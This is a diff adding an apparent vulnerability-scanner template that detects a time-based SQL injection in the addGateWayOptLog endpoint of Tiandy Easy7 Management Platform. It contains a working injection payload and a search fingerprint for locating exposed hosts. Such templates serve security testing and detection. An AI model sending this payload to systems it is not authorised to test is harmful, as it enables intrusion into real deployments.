@@ -1,0 +1,42 @@
+id: poc-yaml-tiandy-easy7-imp-addgatewayoptlog-sqli
+info:
+  name: Tiandy Easy7 Management Platform addGateWayOptLog SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: Easy7 Management Platform
+    fofa: app="Tiandy-Easy7"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        gateLog={"gateLogList":[{"ch_code":"1'union select sleep({{t1}})--+","ch_caption":"1","dt_time":"1"}]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"ret\":"
+          - "\"content\":"
+          - "\"count\":"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > t1"
+          - "duration < t2"
